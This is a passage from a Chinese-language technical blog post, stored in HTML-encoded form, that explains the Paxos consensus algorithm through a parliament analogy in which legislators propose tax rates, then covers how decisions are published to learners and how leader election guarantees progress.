5&#x4F4D;&#x8BAE;&#x5458;&#xFF0C;&#x5C31;&#x7A0E;&#x7387;&#x95EE;&#x9898;&#x8FDB;&#x884C;&#x51B3;&#x8BAE;&#x3002;&#x8BAE;&#x5458;A1&#x51B3;&#x5B9A;&#x5C06;&#x7A0E;&#x7387;&#x5B9A;&#x4E3A;10%,&#x56E0;&#x6B64;&#x5B83;&#x5411;&#x6240;&#x6709;&#x4EBA;&#x53D1;&#x51FA;&#x4E00;&#x4E2A;&#x8349;&#x6848;&#x3002;&#x8FD9;&#x4E2A;&#x8349;&#x6848;&#x7684;&#x5185;&#x5BB9;&#x662F;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x73B0;&#x6709;&#x7684;&#x7A0E;&#x7387;&#x662F;&#x4EC0;&#x4E48;?&#x5982;&#x679C;&#x6CA1;&#x6709;&#x51B3;&#x5B9A;&#xFF0C;&#x5219;&#x5EFA;&#x8BAE;&#x5C06;&#x5176;&#x5B9A;&#x4E3A;10%.&#x65F6;&#x95F4;&#xFF1A;&#x672C;&#x5C4A;&#x8BAE;&#x4F1A;&#x7B2C;3&#x5E74;3&#x6708;15&#x65E5;;&#x63D0;&#x6848;&#x8005;&#xFF1A;A1</span><br></pre></td></tr></table></figure></p>\n<p>&#x5728;&#x6700;&#x7B80;&#x5355;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6CA1;&#x6709;&#x4EBA;&#x4E0E;&#x5176;&#x7ADE;&#x4E89;;&#x4FE1;&#x606F;&#x80FD;&#x53CA;&#x65F6;&#x987A;&#x5229;&#x5730;&#x4F20;&#x8FBE;&#x5230;&#x5176;&#x5B83;&#x8BAE;&#x5458;&#x5904;&#x3002;<br>&#x4E8E;&#x662F;, A2-A5&#x56DE;&#x5E94;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x6211;&#x5DF2;&#x6536;&#x5230;&#x4F60;&#x7684;&#x63D0;&#x6848;&#xFF0C;&#x7B49;&#x5F85;&#x6700;&#x7EC8;&#x6279;&#x51C6;</span><br></pre></td></tr></table></figure></p>\n<p>&#x800C;A1&#x5728;&#x6536;&#x5230;2&#x4EFD;&#x56DE;&#x590D;&#x540E;&#x5C31;&#x53D1;&#x5E03;&#x6700;&#x7EC8;&#x51B3;&#x8BAE;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x7A0E;&#x7387;&#x5DF2;&#x5B9A;&#x4E3A;10%,&#x65B0;&#x7684;&#x63D0;&#x6848;&#x4E0D;&#x5F97;&#x518D;&#x8BA8;&#x8BBA;&#x672C;&#x95EE;&#x9898;&#x3002;</span><br></pre></td></tr></table></figure></p>\n<p>&#x8FD9;&#x5B9E;&#x9645;&#x4E0A;&#x9000;&#x5316;&#x4E3A;&#x4E8C;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x534F;&#x8BAE;&#x3002;<br>&#x73B0;&#x5728;&#x6211;&#x4EEC;&#x5047;&#x8BBE;&#x5728;A1&#x63D0;&#x51FA;&#x63D0;&#x6848;&#x7684;&#x540C;&#x65F6;, A5&#x51B3;&#x5B9A;&#x5C06;&#x7A0E;&#x7387;&#x5B9A;&#x4E3A;20%:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x73B0;&#x6709;&#x7684;&#x7A0E;&#x7387;&#x662F;&#x4EC0;&#x4E48;?&#x5982;&#x679C;&#x6CA1;&#x6709;&#x51B3;&#x5B9A;&#xFF0C;&#x5219;&#x5EFA;&#x8BAE;&#x5C06;&#x5176;&#x5B9A;&#x4E3A;20%.&#x65F6;&#x95F4;&#xFF1A;&#x672C;&#x5C4A;&#x8BAE;&#x4F1A;&#x7B2C;3&#x5E74;3&#x6708;15&#x65E5;;&#x63D0;&#x6848;&#x8005;&#xFF1A;A5</span><br></pre></td></tr></table></figure></p>\n<p>&#x8349;&#x6848;&#x8981;&#x901A;&#x8FC7;&#x4F8D;&#x4ECE;&#x9001;&#x5230;&#x5176;&#x5B83;&#x8BAE;&#x5458;&#x7684;&#x6848;&#x5934;. A1&#x7684;&#x8349;&#x6848;&#x5C06;&#x7531;4&#x4F4D;&#x4F8D;&#x4ECE;&#x9001;&#x5230;A2-A5&#x90A3;&#x91CC;&#x3002;&#x73B0;&#x5728;&#xFF0C;&#x8D1F;&#x8D23;A2&#x548C;A3&#x7684;&#x4F8D;&#x4ECE;&#x5C06;&#x8349;&#x6848;&#x987A;&#x5229;&#x9001;&#x8FBE;&#xFF0C;&#x8D1F;&#x8D23;A4&#x548C;A5&#x7684;&#x4F8D;&#x4ECE;&#x5219;&#x4E0D;&#x4E0A;&#x73ED;. A5&#x7684;&#x8349;&#x6848;&#x5219;&#x987A;&#x5229;&#x7684;&#x9001;&#x81F3;A3&#x548C;A4&#x624B;&#x4E2D;&#x3002;</p>\n<p>&#x73B0;&#x5728;, A1, A2, A3&#x6536;&#x5230;&#x4E86;A1&#x7684;&#x63D0;&#x6848;; A3, A4, A5&#x6536;&#x5230;&#x4E86;A5&#x7684;&#x63D0;&#x6848;&#x3002;&#x6309;&#x7167;&#x534F;&#x8BAE;, A1, A2, A4, A5&#x5C06;&#x63A5;&#x53D7;&#x4ED6;&#x4EEC;&#x6536;&#x5230;&#x7684;&#x63D0;&#x6848;&#xFF0C;&#x4F8D;&#x4ECE;&#x5C06;&#x62FF;&#x7740;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x6211;&#x5DF2;&#x6536;&#x5230;&#x4F60;&#x7684;&#x63D0;&#x6848;&#xFF0C;&#x7B49;&#x5F85;&#x6700;&#x7EC8;&#x6279;&#x51C6;</span><br></pre></td></tr></table></figure></p>\n<p>&#x7684;&#x56DE;&#x590D;&#x56DE;&#x5230;&#x63D0;&#x6848;&#x8005;&#x90A3;&#x91CC;&#x3002;<br>&#x800C;A3&#x7684;&#x884C;&#x4E3A;&#x5C06;&#x51B3;&#x5B9A;&#x6279;&#x51C6;&#x54EA;&#x4E00;&#x4E2A;&#x3002;</p>\n<h5 id=\"&#x60C5;&#x51B5;&#x4E00;\"><a href=\"#&#x60C5;&#x51B5;&#x4E00;\" class=\"headerlink\" title=\"&#x60C5;&#x51B5;&#x4E00;\"></a>&#x60C5;&#x51B5;&#x4E00;</h5><p>&#x5047;&#x8BBE;A1&#x7684;&#x63D0;&#x6848;&#x5148;&#x9001;&#x5230;A3&#x5904;&#xFF0C;&#x800C;A5&#x7684;&#x4F8D;&#x4ECE;&#x51B3;&#x5B9A;&#x653E;&#x5047;&#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#x3002;&#x4E8E;&#x662F;A3&#x63A5;&#x53D7;&#x5E76;&#x6D3E;&#x51FA;&#x4E86;&#x4F8D;&#x4ECE;. A1&#x7B49;&#x5230;&#x4E86;&#x4E24;&#x4F4D;&#x4F8D;&#x4ECE;&#xFF0C;&#x52A0;&#x4E0A;&#x5B83;&#x81EA;&#x5DF1;&#x5DF2;&#x7ECF;&#x6784;&#x6210;&#x4E00;&#x4E2A;&#x591A;&#x6570;&#x6D3E;&#xFF0C;&#x4E8E;&#x662F;&#x7A0E;&#x7387;10%&#x5C06;&#x6210;&#x4E3A;&#x51B3;&#x8BAE;. A1&#x6D3E;&#x51FA;&#x4F8D;&#x4ECE;&#x5C06;&#x51B3;&#x8BAE;&#x9001;&#x5230;&#x6240;&#x6709;&#x8BAE;&#x5458;&#x5904;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x7A0E;&#x7387;&#x5DF2;&#x5B9A;&#x4E3A;10%,&#x65B0;&#x7684;&#x63D0;&#x6848;&#x4E0D;&#x5F97;&#x518D;&#x8BA8;&#x8BBA;&#x672C;&#x95EE;&#x9898;&#x3002;</span><br></pre></td></tr></table></figure></p>\n<p>A3&#x5728;&#x5F88;&#x4E45;&#x4EE5;&#x540E;&#x6536;&#x5230;&#x4E86;&#x6765;&#x81EA;A5&#x7684;&#x63D0;&#x6848;&#x3002;&#x7531;&#x4E8E;&#x7A0E;&#x7387;&#x95EE;&#x9898;&#x5DF2;&#x7ECF;&#x8BA8;&#x8BBA;&#x5B8C;&#x6BD5;&#xFF0C;&#x4ED6;&#x51B3;&#x5B9A;&#x4E0D;&#x518D;&#x7406;&#x4F1A;&#x3002;&#x4F46;&#x662F;&#x4ED6;&#x8981;&#x62B1;&#x6028;&#x4E00;&#x53E5;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x7A0E;&#x7387;&#x5DF2;&#x5728;&#x4E4B;&#x524D;&#x7684;&#x6295;&#x7968;&#x4E2D;&#x5B9A;&#x4E3A;10%,&#x4F60;&#x4E0D;&#x8981;&#x518D;&#x6765;&#x70E6;&#x6211;!</span><br></pre></td></tr></table></figure></p>\n<p>&#x8FD9;&#x4E2A;&#x56DE;&#x590D;&#x5BF9;A5&#x53EF;&#x80FD;&#x6709;&#x5E2E;&#x52A9;&#xFF0C;&#x56E0;&#x4E3A;A5&#x53EF;&#x80FD;&#x56E0;&#x4E3A;&#x67D0;&#x79CD;&#x539F;&#x56E0;&#x5F88;&#x4E45;&#x65E0;&#x6CD5;&#x4E0E;&#x4E0E;&#x5916;&#x754C;&#x8054;&#x7CFB;&#x4E86;&#x3002;&#x5F53;&#x7136;&#x66F4;&#x53EF;&#x80FD;&#x5BF9;A5&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x4F5C;&#x7528;&#xFF0C;&#x56E0;&#x4E3A;A5&#x53EF;&#x80FD;&#x5DF2;&#x7ECF;&#x4ECE;A1&#x5904;&#x83B7;&#x5F97;&#x4E86;&#x521A;&#x624D;&#x7684;&#x51B3;&#x8BAE;&#x3002;</p>\n<h5 id=\"&#x60C5;&#x51B5;&#x4E8C;\"><a href=\"#&#x60C5;&#x51B5;&#x4E8C;\" class=\"headerlink\" title=\"&#x60C5;&#x51B5;&#x4E8C;\"></a>&#x60C5;&#x51B5;&#x4E8C;</h5><p>&#x4F9D;&#x7136;&#x5047;&#x8BBE;A1&#x7684;&#x63D0;&#x6848;&#x5148;&#x9001;&#x5230;A3&#x5904;&#xFF0C;&#x4F46;&#x662F;&#x8FD9;&#x6B21;A5&#x7684;&#x4F8D;&#x4ECE;&#x4E0D;&#x662F;&#x653E;&#x5047;&#x4E86;&#xFF0C;&#x53EA;&#x662F;&#x4E2D;&#x9014;&#x803D;&#x6401;&#x4E86;&#x4E00;&#x4F1A;&#x3002;&#x8FD9;&#x6B21;, A3&#x4F9D;&#x7136;&#x4F1A;&#x5C06;&#x201D;&#x63A5;&#x53D7;&#x201D;&#x56DE;&#x590D;&#x7ED9;A1.&#x4F46;&#x662F;&#x5728;&#x51B3;&#x8BAE;&#x6210;&#x578B;&#x4E4B;&#x524D;&#x5B83;&#x53C8;&#x6536;&#x5230;&#x4E86;A5&#x7684;&#x63D0;&#x6848;&#x3002;&#x8FD9;&#x65F6;&#x534F;&#x8BAE;&#x6709;&#x4E24;&#x79CD;&#x5904;&#x7406;&#x65B9;&#x5F0F;&#xFF1A;<br>1.&#x5982;&#x679C;A5&#x7684;&#x63D0;&#x6848;&#x66F4;&#x65E9;&#xFF0C;&#x6309;&#x7167;&#x4F20;&#x7EDF;&#x5E94;&#x8BE5;&#x7531;&#x8F83;&#x65E9;&#x7684;&#x63D0;&#x6848;&#x8005;&#x4E3B;&#x6301;&#x6295;&#x7968;&#x3002;&#x73B0;&#x5728;&#x770B;&#x6765;&#x4E24;&#x4EFD;&#x63D0;&#x6848;&#x7684;&#x65F6;&#x95F4;&#x4E00;&#x6837;&#xFF08;&#x672C;&#x5C4A;&#x8BAE;&#x4F1A;&#x7B2C;3&#x5E74;3&#x6708;15&#x65E5;&#xFF09;&#x3002;&#x4F46;&#x662F;A5&#x662F;&#x4E2A;&#x60F9;&#x4E0D;&#x8D77;&#x7684;&#x5927;&#x4EBA;&#x7269;&#x3002;&#x4E8E;&#x662F;A3&#x56DE;&#x590D;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x6211;&#x5DF2;&#x6536;&#x5230;&#x60A8;&#x7684;&#x63D0;&#x6848;&#xFF0C;&#x7B49;&#x5F85;&#x6700;&#x7EC8;&#x6279;&#x51C6;&#xFF0C;&#x4F46;&#x662F;&#x60A8;&#x4E4B;&#x524D;&#x6709;&#x4EBA;&#x63D0;&#x51FA;&#x5C06;&#x7A0E;&#x7387;&#x5B9A;&#x4E3A;10%,&#x8BF7;&#x660E;&#x5BDF;&#x3002;</span><br></pre></td></tr></table></figure></p>\n<p>&#x4E8E;&#x662F;, A1&#x548C;A5&#x90FD;&#x6536;&#x5230;&#x4E86;&#x8DB3;&#x591F;&#x7684;&#x56DE;&#x590D;&#x3002;&#x8FD9;&#x65F6;&#x5173;&#x4E8E;&#x7A0E;&#x7387;&#x95EE;&#x9898;&#x5C31;&#x6709;&#x4E24;&#x4E2A;&#x63D0;&#x6848;&#x5728;&#x540C;&#x65F6;&#x8FDB;&#x884C;&#x3002;&#x4F46;&#x662F;A5&#x77E5;&#x9053;&#x4E4B;&#x524D;&#x6709;&#x4EBA;&#x63D0;&#x51FA;&#x7A0E;&#x7387;&#x4E3A;10%.&#x4E8E;&#x662F;A1&#x548C;A5&#x90FD;&#x4F1A;&#x5411;&#x5168;&#x4F53;&#x8BAE;&#x5458;&#x5E7F;&#x64AD;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x7A0E;&#x7387;&#x5DF2;&#x5B9A;&#x4E3A;10%,&#x65B0;&#x7684;&#x63D0;&#x6848;&#x4E0D;&#x5F97;&#x518D;&#x8BA8;&#x8BBA;&#x672C;&#x95EE;&#x9898;&#x3002;</span><br></pre></td></tr></table></figure></p>\n<p>&#x4E00;&#x81F4;&#x6027;&#x5F97;&#x5230;&#x4E86;&#x4FDD;&#x8BC1;&#x3002;</p>\n<ol>\n<li>A5&#x662F;&#x4E2A;&#x65E0;&#x8DB3;&#x8F7B;&#x91CD;&#x7684;&#x5C0F;&#x4EBA;&#x7269;&#x3002;&#x8FD9;&#x65F6;A3&#x4E0D;&#x518D;&#x7406;&#x4F1A;&#x4ED6;, A1&#x4E0D;&#x4E45;&#x540E;&#x5C31;&#x4F1A;&#x5E7F;&#x64AD;&#x7A0E;&#x7387;&#x5B9A;&#x4E3A;10%.</li>\n</ol>\n<h5 id=\"&#x60C5;&#x51B5;&#x4E09;\"><a href=\"#&#x60C5;&#x51B5;&#x4E09;\" class=\"headerlink\" title=\"&#x60C5;&#x51B5;&#x4E09;\"></a>&#x60C5;&#x51B5;&#x4E09;</h5><p>&#x5728;&#x8FD9;&#x4E2A;&#x60C5;&#x51B5;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x5C06;&#x770B;&#x89C1;&#xFF0C;&#x6839;&#x636E;&#x63D0;&#x6848;&#x7684;&#x65F6;&#x95F4;&#x53CA;&#x63D0;&#x6848;&#x8005;&#x7684;&#x6743;&#x52BF;&#x51B3;&#x5B9A;&#x662F;&#x5426;&#x5E94;&#x7B54;&#x662F;&#x6709;&#x610F;&#x4E49;&#x7684;&#x3002;&#x5728;&#x8FD9;&#x91CC;&#xFF0C;&#x65F6;&#x95F4;&#x548C;&#x63D0;&#x6848;&#x8005;&#x7684;&#x6743;&#x52BF;&#x5C31;&#x6784;&#x6210;&#x4E86;&#x7ED9;&#x63D0;&#x6848;&#x7F16;&#x53F7;&#x7684;&#x4F9D;&#x636E;&#x3002;&#x8FD9;&#x6837;&#x7684;&#x7F16;&#x53F7;&#x7B26;&#x5408;&#x201D;&#x4EFB;&#x4F55;&#x4E24;&#x4E2A;&#x63D0;&#x6848;&#x4E4B;&#x95F4;&#x6784;&#x6210;&#x504F;&#x5E8F;&#x201D;&#x7684;&#x8981;&#x6C42;&#x3002;</p>\n<p>A1&#x548C;A5&#x540C;&#x6837;&#x63D0;&#x51FA;&#x4E0A;&#x8FF0;&#x63D0;&#x6848;&#xFF0C;&#x8FD9;&#x65F6;A1&#x53EF;&#x4EE5;&#x6B63;&#x5E38;&#x8054;&#x7CFB;A2&#x548C;A3; A5&#x4E5F;&#x53EF;&#x4EE5;&#x6B63;&#x5E38;&#x8054;&#x7CFB;&#x8FD9;&#x4E24;&#x4E2A;&#x4EBA;&#x3002;&#x8FD9;&#x6B21;A2&#x5148;&#x6536;&#x5230;A1&#x7684;&#x63D0;&#x6848;; A3&#x5219;&#x5148;&#x6536;&#x5230;A5&#x7684;&#x63D0;&#x6848;. A5&#x66F4;&#x6709;&#x6743;&#x52BF;&#x3002;</p>\n<p>&#x5728;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5DF2;&#x7ECF;&#x56DE;&#x7B54;A1&#x7684;A2&#x53D1;&#x73B0;&#x6709;&#x6BD4;A1&#x66F4;&#x6709;&#x6743;&#x52BF;&#x7684;A5&#x63D0;&#x51FA;&#x4E86;&#x7A0E;&#x7387;20%&#x7684;&#x65B0;&#x63D0;&#x6848;&#xFF0C;&#x4E8E;&#x662F;&#x56DE;&#x590D;A5&#x8BF4;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x6211;&#x5DF2;&#x6536;&#x5230;&#x60A8;&#x7684;&#x63D0;&#x6848;&#xFF0C;&#x7B49;&#x5F85;&#x6700;&#x7EC8;&#x6279;&#x51C6;&#x3002;</span><br></pre></td></tr></table></figure></p>\n<p>&#x800C;&#x56DE;&#x590D;&#x4E86;A5&#x7684;A3&#x53D1;&#x73B0;&#x65B0;&#x7684;&#x63D0;&#x6848;&#x8005;A1&#x662F;&#x4E2A;&#x5C0F;&#x4EBA;&#x7269;&#xFF0C;&#x4E0D;&#x4E88;&#x7406;&#x4F1A;&#x3002;</p>\n<p>A1&#x6CA1;&#x6709;&#x8FBE;&#x5230;&#x591A;&#x6570;&#xFF0C;A5&#x8FBE;&#x5230;&#x4E86;&#xFF0C;&#x4E8E;&#x662F;A5&#x5C06;&#x4E3B;&#x6301;&#x6295;&#x7968;&#xFF0C;&#x51B3;&#x8BAE;&#x7684;&#x5185;&#x5BB9;&#x662F;A5&#x63D0;&#x51FA;&#x7684;&#x7A0E;&#x7387;20%.</p>\n<p>&#x5982;&#x679C;A3&#x51B3;&#x5B9A;&#x5E73;&#x7B49;&#x5730;&#x5BF9;&#x5F85;&#x6BCF;&#x4E00;&#x4F4D;&#x8BAE;&#x5458;&#xFF0C;&#x5BF9;A1&#x505A;&#x51FA;&#x201D;&#x4F60;&#x4E4B;&#x524D;&#x6709;&#x4EBA;&#x63D0;&#x51FA;&#x5C06;&#x7A0E;&#x7387;&#x5B9A;&#x4E3A;20%&#x201D;&#x7684;&#x56DE;&#x590D;&#xFF0C;&#x5219;&#x5C06;&#x9020;&#x6210;&#x6DF7;&#x4E71;&#x3002;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;A1&#x548C;A5&#x90FD;&#x5C06;&#x8BD5;&#x56FE;&#x4E3B;&#x6301;&#x6295;&#x7968;&#xFF0C;&#x4F46;&#x662F;&#x8FD9;&#x6B21;&#x4E24;&#x4EFD;&#x63D0;&#x6848;&#x7684;&#x5185;&#x5BB9;&#x4E0D;&#x540C;&#x3002;</p>\n<p>&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;, A3&#x82E5;&#x5BF9;A1&#x8FDB;&#x884C;&#x56DE;&#x590D;&#xFF0C;&#x53EA;&#x80FD;&#x8BF4;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x6709;&#x66F4;&#x5927;&#x7684;&#x4EBA;&#x7269;&#x5173;&#x6CE8;&#x6B64;&#x4E8B;&#xFF0C;&#x8BF7;&#x7B49;&#x5F85;&#x4ED6;&#x505A;&#x51FA;&#x51B3;&#x5B9A;&#x3002;</span><br></pre></td></tr></table></figure></p>\n<p>&#x53E6;&#x5916;&#xFF0C;&#x5728;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;, A4&#x4E0E;&#x5916;&#x754C;&#x5931;&#x53BB;&#x4E86;&#x8054;&#x7CFB;&#x3002;&#x7B49;&#x5230;&#x4ED6;&#x6062;&#x590D;&#x8054;&#x7CFB;&#xFF0C;&#x5E76;&#x9700;&#x8981;&#x5F97;&#x77E5;&#x7A0E;&#x7387;&#x60C5;&#x51B5;&#x65F6;&#xFF0C;&#x4ED6;&#xFF08;&#x5728;&#x6700;&#x7B80;&#x5355;&#x7684;&#x534F;&#x8BAE;&#x4E2D;&#xFF09;&#x5C06;&#x63D0;&#x51FA;&#x4E00;&#x4E2A;&#x63D0;&#x6848;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x73B0;&#x6709;&#x7684;&#x7A0E;&#x7387;&#x662F;&#x4EC0;&#x4E48;?&#x5982;&#x679C;&#x6CA1;&#x6709;&#x51B3;&#x5B9A;&#xFF0C;&#x5219;&#x5EFA;&#x8BAE;&#x5C06;&#x5176;&#x5B9A;&#x4E3A;15%.&#x65F6;&#x95F4;&#xFF1A;&#x672C;&#x5C4A;&#x8BAE;&#x4F1A;&#x7B2C;3&#x5E74;4&#x6708;1&#x65E5;;&#x63D0;&#x6848;&#x8005;&#xFF1A;A4</span><br></pre></td></tr></table></figure></p>\n<p>&#x8FD9;&#x65F6;&#xFF0C;&#xFF08;&#x5728;&#x6700;&#x7B80;&#x5355;&#x7684;&#x534F;&#x8BAE;&#x4E2D;&#xFF09;&#x5176;&#x4ED6;&#x8BAE;&#x5458;&#x5C06;&#x4F1A;&#x56DE;&#x590D;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x7A0E;&#x7387;&#x5DF2;&#x5728;&#x4E4B;&#x524D;&#x7684;&#x6295;&#x7968;&#x4E2D;&#x5B9A;&#x4E3A;20%,&#x4F60;&#x4E0D;&#x8981;&#x518D;&#x6765;&#x70E6;&#x6211;!</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"&#x51B3;&#x8BAE;&#x7684;&#x53D1;&#x5E03;\"><a href=\"#&#x51B3;&#x8BAE;&#x7684;&#x53D1;&#x5E03;\" class=\"headerlink\" title=\"&#x51B3;&#x8BAE;&#x7684;&#x53D1;&#x5E03;\"></a>&#x51B3;&#x8BAE;&#x7684;&#x53D1;&#x5E03;</h4><p>&#x4E00;&#x4E2A;&#x663E;&#x800C;&#x6613;&#x89C1;&#x7684;&#x65B9;&#x6CD5;&#x662F;&#x5F53;acceptors&#x6279;&#x51C6;&#x4E00;&#x4E2A;value&#x65F6;&#xFF0C;&#x5C06;&#x8FD9;&#x4E2A;&#x6D88;&#x606F;&#x53D1;&#x9001;&#x7ED9;&#x6240;&#x6709;learner&#x3002;&#x4F46;&#x662F;&#x8FD9;&#x4E2A;&#x65B9;&#x6CD5;&#x4F1A;&#x5BFC;&#x81F4;&#x6D88;&#x606F;&#x91CF;&#x8FC7;&#x5927;&#x3002;<br>&#x7531;&#x4E8E;&#x5047;&#x8BBE;&#x6CA1;&#x6709;Byzantine failures&#xFF0C;learners&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x522B;&#x7684;learners&#x83B7;&#x53D6;&#x5DF2;&#x7ECF;&#x901A;&#x8FC7;&#x7684;&#x51B3;&#x8BAE;&#x3002;&#x56E0;&#x6B64;acceptors&#x53EA;&#x9700;&#x5C06;&#x6279;&#x51C6;&#x7684;&#x6D88;&#x606F;&#x53D1;&#x9001;&#x7ED9;&#x6307;&#x5B9A;&#x7684;&#x67D0;&#x4E00;&#x4E2A;learner&#xFF0C;&#x5176;&#x4ED6;learners&#x5411;&#x5B83;&#x8BE2;&#x95EE;&#x5DF2;&#x7ECF;&#x901A;&#x8FC7;&#x7684;&#x51B3;&#x8BAE;&#x3002;&#x8FD9;&#x4E2A;&#x65B9;&#x6CD5;&#x964D;&#x4F4E;&#x4E86;&#x6D88;&#x606F;&#x91CF;&#xFF0C;&#x4F46;&#x662F;&#x6307;&#x5B9A;learner&#x5931;&#x6548;&#x5C06;&#x5F15;&#x8D77;&#x7CFB;&#x7EDF;&#x5931;&#x6548;&#x3002;</p>\n<p>&#x56E0;&#x6B64;acceptors&#x9700;&#x8981;&#x5C06;accept&#x6D88;&#x606F;&#x53D1;&#x9001;&#x7ED9;learners&#x7684;&#x4E00;&#x4E2A;&#x5B50;&#x96C6;&#xFF0C;&#x7136;&#x540E;&#x7531;&#x8FD9;&#x4E9B;learners&#x53BB;&#x901A;&#x77E5;&#x6240;&#x6709;learners&#x3002;<br>&#x4F46;&#x662F;&#x7531;&#x4E8E;&#x6D88;&#x606F;&#x4F20;&#x9012;&#x7684;&#x4E0D;&#x786E;&#x5B9A;&#x6027;&#xFF0C;&#x53EF;&#x80FD;&#x4F1A;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;learner&#x83B7;&#x5F97;&#x4E86;&#x51B3;&#x8BAE;&#x6279;&#x51C6;&#x7684;&#x6D88;&#x606F;&#x3002;&#x5F53;learners&#x9700;&#x8981;&#x4E86;&#x89E3;&#x51B3;&#x8BAE;&#x901A;&#x8FC7;&#x60C5;&#x51B5;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x8BA9;&#x4E00;&#x4E2A;proposer&#x91CD;&#x65B0;&#x8FDB;&#x884C;&#x4E00;&#x6B21;&#x63D0;&#x6848;&#x3002;&#x6CE8;&#x610F;&#x4E00;&#x4E2A;learner&#x53EF;&#x80FD;&#x517C;&#x4EFB;proposer&#x3002;</p>\n<h4 id=\"Progress&#x7684;&#x4FDD;&#x8BC1;\"><a href=\"#Progress&#x7684;&#x4FDD;&#x8BC1;\" class=\"headerlink\" title=\"Progress&#x7684;&#x4FDD;&#x8BC1;\"></a>Progress&#x7684;&#x4FDD;&#x8BC1;</h4><p>&#x6839;&#x636E;&#x4E0A;&#x8FF0;&#x8FC7;&#x7A0B;&#x5F53;&#x4E00;&#x4E2A;proposer&#x53D1;&#x73B0;&#x5B58;&#x5728;&#x7F16;&#x53F7;&#x66F4;&#x5927;&#x7684;&#x63D0;&#x6848;&#x65F6;&#x5C06;&#x7EC8;&#x6B62;&#x63D0;&#x6848;&#x3002;&#x8FD9;&#x610F;&#x5473;&#x7740;&#x63D0;&#x51FA;&#x4E00;&#x4E2A;&#x7F16;&#x53F7;&#x66F4;&#x5927;&#x7684;&#x63D0;&#x6848;&#x4F1A;&#x7EC8;&#x6B62;&#x4E4B;&#x524D;&#x7684;&#x63D0;&#x6848;&#x8FC7;&#x7A0B;&#x3002;&#x5982;&#x679C;&#x4E24;&#x4E2A;proposer&#x5728;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#x90FD;&#x8F6C;&#x800C;&#x63D0;&#x51FA;&#x4E00;&#x4E2A;&#x7F16;&#x53F7;&#x66F4;&#x5927;&#x7684;&#x63D0;&#x6848;&#xFF0C;&#x5C31;&#x53EF;&#x80FD;&#x9677;&#x5165;&#x6D3B;&#x9501;&#xFF0C;&#x8FDD;&#x80CC;&#x4E86;Progress&#x7684;&#x8981;&#x6C42;&#x3002;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x662F;&#x9009;&#x4E3E;&#x51FA;&#x4E00;&#x4E2A;leader&#xFF0C;&#x4EC5;&#x5141;&#x8BB8;leader&#x63D0;&#x51FA;&#x63D0;&#x6848;&#x3002;&#x4F46;&#x662F;&#x7531;&#x4E8E;&#x6D88;&#x606F;&#x4F20;&#x9012;&#x7684;&#x4E0D;&#x786E;&#x5B9A;&#x6027;&#xFF0C;&#x53EF;&#x80FD;&#x6709;&#x591A;&#x4E2A;proposer&#x81EA;&#x8BA4;&#x4E3A;&#x81EA;&#x5DF1;&#x5DF2;&#x7ECF;&#x6210;&#x4E3A;leader&#x3002;Lamport&#x5728;The Part-Time Parliament&#x4E00;&#x6587;&#x4E2D;&#x63CF;&#x8FF0;&#x5E76;&#x89E3;&#x51B3;&#x4E86;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#x3002;</p>\n","excerpt":"<p>Paxos&#x7B97;&#x6CD5;&#x662F;&#x83B1;&#x65AF;&#x5229;&#xB7;&#x5170;&#x4F2F;&#x7279;&#xFF08;&#x82F1;&#x8BED;&#xFF1A;Leslie 